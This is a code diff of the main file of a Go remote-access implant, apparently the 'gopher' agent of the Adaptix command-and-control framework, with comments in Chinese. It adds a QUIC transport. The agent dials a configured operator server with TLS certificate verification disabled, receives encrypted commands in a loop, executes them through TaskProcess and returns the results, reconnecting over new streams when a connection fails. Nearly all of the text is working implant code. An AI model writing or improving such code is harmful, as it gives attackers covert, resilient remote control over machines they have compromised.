@@ -1,10 +1,12 @@
 package main
 
 import (
+	"context"
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/binary"
+	"fmt"
 	"gopher/functions"
 	"gopher/utils"
 	"net"
@@ -12,8 +14,10 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"sync"
 	"time"
 
+	"github.com/quic-go/quic-go"
 	"github.com/vmihailenco/msgpack/v5"
 )
 
@@ -91,8 +95,8 @@ func main() {
 
 	sessionInfo, sessionKey := CreateInfo()
 
-	// UDP协议需要特殊处理：在 sessionInfo 中使用配置密钥
-	if profile.Protocol == "udp" {
+	// QUIC协议需要特殊处理：在 sessionInfo 中使用配置密钥
+	if profile.Protocol == "quic" {
 		// 反序列化 sessionInfo
 		var info utils.SessionInfo
 		_ = msgpack.Unmarshal(sessionInfo, &info)
@@ -100,12 +104,12 @@ func main() {
 		info.EncryptKey = encKey
 		// 重新序列化
 		sessionInfo, _ = msgpack.Marshal(info)
-		// UDP 模式下使用配置密钥作为 sessionKey
+		// QUIC 模式下使用配置密钥作为 sessionKey
 		sessionKey = encKey
 	}
 
-	// UDP协议使用配置密钥，TCP协议使用会话密钥
-	if profile.Protocol == "udp" {
+	// QUIC协议使用配置密钥，TCP协议使用会话密钥
+	if profile.Protocol == "quic" {
 		utils.SKey = encKey
 	} else {
 		utils.SKey = sessionKey
@@ -133,17 +137,45 @@ func main() {
 		///// Connect
 
 		var (
-			err  error
-			conn net.Conn
+			err      error
+			conn     net.Conn
+			session  quic.Connection
+			stream   quic.Stream
+			streamMu sync.Mutex // 保护流的并发访问
 		)
 
-		if profile.Protocol == "udp" {
-			// UDP connection
-			udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[addrIndex])
+		if profile.Protocol == "quic" {
+			// QUIC connection - 参考 Merlin 的配置
+			tlsConf := &tls.Config{
+				InsecureSkipVerify: true,
+				NextProtos:         []string{"adaptix-quic"},
+				MinVersion:         tls.VersionTLS12,
+			}
+
+			quicConf := &quic.Config{
+				// MaxIdleTimeout: 30 秒超时
+				MaxIdleTimeout: 30 * time.Second,
+				// KeepAlivePeriod: 30 秒发送 PING 保持连接
+				KeepAlivePeriod: 30 * time.Second,
+				// HandshakeIdleTimeout: 握手超时
+				HandshakeIdleTimeout: 30 * time.Second,
+			}
+
+			session, err = quic.DialAddr(context.Background(), profile.Addresses[addrIndex], tlsConf, quicConf)
 			if err != nil {
 				continue
 			}
-			conn, err = net.DialUDP("udp", nil, udpAddr)
+
+			// 打开单个流用于初始化
+			stream, err = session.OpenStreamSync(context.Background())
+			if err != nil {
+				session.CloseWithError(0, "failed to open stream")
+				continue
+			}
+
+			// 包装为 net.Conn 接口
+			conn = &functions.QUICStreamConn{Stream: stream, Session: session}
+
 		} else if profile.UseSSL {
 			// TCP with SSL/TLS
 			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
@@ -165,6 +197,7 @@ func main() {
 			// TCP without SSL
 			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
 		}
+
 		if err != nil {
 			continue
 		} else {
@@ -175,6 +208,9 @@ func main() {
 		if profile.BannerSize > 0 {
 			_, err := functions.ConnRead(conn, profile.BannerSize)
 			if err != nil {
+				if session != nil {
+					session.CloseWithError(0, "banner read failed")
+				}
 				continue
 			}
 		}
@@ -182,7 +218,7 @@ func main() {
 		/// Send Init
 		_ = functions.SendMsg(conn, initMsg)
 
-		/// Recv Command
+		/// Recv Command - 主通信循环
 
 		var (
 			inMessage  utils.Message
@@ -193,15 +229,35 @@ func main() {
 
 		// 根据协议选择加密密钥
 		var cryptKey []byte
-		if _, ok := conn.(*net.UDPConn); ok {
-			cryptKey = encKey // UDP使用配置文件密钥（与Server端一致）
+		if profile.Protocol == "quic" {
+			cryptKey = encKey // QUIC使用配置文件密钥（与Server端一致）
 		} else {
 			cryptKey = sessionKey // TCP继续使用会话密钥
 		}
 
+		// 主通信循环 - 确保命令执行的可靠性
 		for ACTIVE {
+			// 接收命令
 			recvData, err = functions.RecvMsg(conn)
 			if err != nil {
+				// 错误处理 - 对于 QUIC，关闭当前流并重新连接
+				if profile.Protocol == "quic" && session != nil {
+					// QUIC 支持连接迁移和多路复用
+					// 尝试在同一会话上打开新流
+					streamMu.Lock()
+					newStream, streamErr := session.OpenStreamSync(context.Background())
+					streamMu.Unlock()
+
+					if streamErr == nil {
+						// 成功打开新流，更新连接
+						stream.Close()
+						stream = newStream
+						conn = &functions.QUICStreamConn{Stream: stream, Session: session}
+						// 重试接收
+						continue
+					}
+				}
+				// 如果是 TCP 或 QUIC 会话失败，退出循环重新连接
 				break
 			}
 
@@ -218,12 +274,45 @@ func main() {
 
 			if inMessage.Type == 1 {
 				outMessage.Type = 1
+				// 执行命令
 				outMessage.Object = TaskProcess(inMessage.Object)
 			}
 
+			// 发送响应
 			sendData, _ = msgpack.Marshal(outMessage)
 			sendData, _ = utils.EncryptData(sendData, cryptKey)
-			_ = functions.SendMsg(conn, sendData)
+
+			err = functions.SendMsg(conn, sendData)
+			if err != nil {
+				// 发送失败处理
+				if profile.Protocol == "quic" && session != nil {
+					// 尝试在新流上重新发送
+					streamMu.Lock()
+					newStream, streamErr := session.OpenStreamSync(context.Background())
+					streamMu.Unlock()
+
+					if streamErr == nil {
+						stream.Close()
+						stream = newStream
+						conn = &functions.QUICStreamConn{Stream: stream, Session: session}
+						// 重试发送
+						_ = functions.SendMsg(conn, sendData)
+					}
+				}
+				break
+			}
+		}
+
+		// 清理连接
+		if profile.Protocol == "quic" {
+			if stream != nil {
+				stream.Close()
+			}
+			if session != nil {
+				session.CloseWithError(0, "disconnecting")
+			}
+		} else {
+			conn.Close()
 		}
 	}
 }
